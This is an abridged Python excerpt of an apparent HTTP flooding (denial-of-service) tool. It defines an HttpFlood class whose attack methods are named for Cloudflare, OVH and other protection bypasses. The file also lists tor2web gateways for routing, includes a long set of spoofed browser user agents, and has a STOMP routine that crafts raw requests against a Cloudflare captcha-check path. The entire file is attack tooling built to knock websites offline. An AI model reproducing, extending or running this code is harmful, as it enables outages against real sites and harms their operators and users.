...
from .utils import BYTES_SEND, REQUESTS_SENT, Tools, exit, logger, bcolors, ProxyManager
...
tor2webs = [
    ...
    'onion.my', 'onion.sh', 'onion.lu', 'onion.casa', 'onion.com.de',
    'onion.foundation', 'onion.rodeo', 'onion.lat', 'tor2web.org', 'tor2web.fi',
    'tor2web.blutmagie.de', 'tor2web.to', 'tor2web.io', 'tor2web.in', 'tor2web.it',
...
class HttpFlood(Thread):
    METHODS: Set[str] = {
        "POST", "CFB", "CFBUAM", "XMLRPC", "BOT", "APACHE", "BYPASS", "DGB",
        "OVH", "AVB", "STRESS", "DYN", "SLOW", "GSB", "RHEX", "STOMP",
        "NULL", "COOKIE", "TOR", "EVEN", "DOWNLOADER", "BOMB", "PPS", "KILLER", "GET"
    }
    ...
    def __init__(self,
        ...
        if not useragents:
            useragents: List[str] = [
                ...
                'Mozilla/5.0 (Linux; U; Android 2.2.1; de-at; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; cs-cz; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                ...
                'Mozilla/5.0 (Linux; Android 7.1.2; Pixel XL Build/N2G47O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11862 Mobile/16A366 Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) CriOS/61.0.3163.73 Mobile/15A372 Safari/604.1',
                'Mozilla/5.g (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/58.0.3029.113 Mobile/14E304 Safari/602.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) FxiOS/8.0 Mobile/14E304 Safari/603.1.30',
                'Mozilla/5.0 (iPad; CPU OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/605.1.15',
    ...
    def STOMP(self):
        ...
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
            ...
            f"%s {self._target.path_qs}/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type) +
            f"Host: {hexh}\r\n" +
    ...
    def BOMB(self):
        logger.error("The BOMB method requires the 'bombardier' executable, which was not found.")
        logger.info("For this method to work, please download it and place it in the root directory of the project.")
...
class Layer7:
    METHODS: Set[str] = HttpFlood.METHODS
